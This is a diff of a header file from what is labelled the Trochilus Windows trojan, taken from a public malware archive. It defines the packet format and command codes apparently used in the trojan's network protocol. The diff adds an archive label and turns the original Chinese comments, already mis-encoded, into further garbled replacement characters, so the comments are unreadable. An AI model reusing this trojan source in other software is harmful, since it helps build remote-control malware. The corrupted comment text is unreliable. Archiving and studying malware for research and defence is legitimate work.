@@ -1,11 +1,22 @@
+/*
+  name      Trochilus
+  type      trojan
+  cve       â€”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     â€”
+ */
 #pragma once
 #include "AutoCleanup.h"
 
-//°üÐòÁÐºÅ
+//ï¿½ï¿½ï¿½ï¿½ï¿½Ðºï¿½
 #define CPSERIAL ULONG
 
 #pragma pack(1)
-//±êÊ¶¿Í»§¶ËµÄid
+//ï¿½ï¿½Ê¶ï¿½Í»ï¿½ï¿½Ëµï¿½id
 typedef struct CPGUID {
 	DWORD	data1;
 	USHORT	data2;
@@ -51,7 +62,7 @@ typedef struct CPGUID {
 	}
 } CPGUID;
 
-//°üÍ·
+//ï¿½ï¿½Í·
 typedef struct  
 {
 	CPGUID		guid;
@@ -63,13 +74,13 @@ typedef struct
 #define CPHEADER_SIZE sizeof(CP_HEADER)
 #define PACKET_SIZE(_pPacket) (CPHEADER_SIZE + _pPacket->header.size)
 
-#define CPCMD_DATA_MORE		0	//»¹ÓÐ¸ü¶àµÄÊý¾Ý
-#define CPCMD_DATA_END		1	//Õâ¸ö°üÊÇ×îºóÒ»¸ö°ü
-#define CPCMD_RESEND		2	//indexÎªÆÚÍûµÄindex£¬sizeÎªÒÑÊÕµ½µÄÊý¾Ý´óÐ¡
-#define CPCMD_ABORT_SEND	3	//ÖÐÖ¹´«Êä
-#define CPCMD_NO_DATA		4	//Õâ¸ö°üÖÐÃ»ÓÐÊý¾Ý£¬Ö»ÊÇÎªÁËÓ¦´ð
+#define CPCMD_DATA_MORE		0	//ï¿½ï¿½ï¿½Ð¸ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
+#define CPCMD_DATA_END		1	//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ò»ï¿½ï¿½ï¿½ï¿½
+#define CPCMD_RESEND		2	//indexÎªï¿½ï¿½ï¿½ï¿½ï¿½ï¿½indexï¿½ï¿½sizeÎªï¿½ï¿½ï¿½Õµï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ý´ï¿½Ð¡
+#define CPCMD_ABORT_SEND	3	//ï¿½ï¿½Ö¹ï¿½ï¿½ï¿½ï¿½
+#define CPCMD_NO_DATA		4	//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ã»ï¿½ï¿½ï¿½ï¿½ï¿½Ý£ï¿½Ö»ï¿½ï¿½Îªï¿½ï¿½Ó¦ï¿½ï¿½
 
-//Êý¾Ý°ü
+//ï¿½ï¿½ï¿½Ý°ï¿½
 typedef struct 
 {
 	CP_HEADER	header;
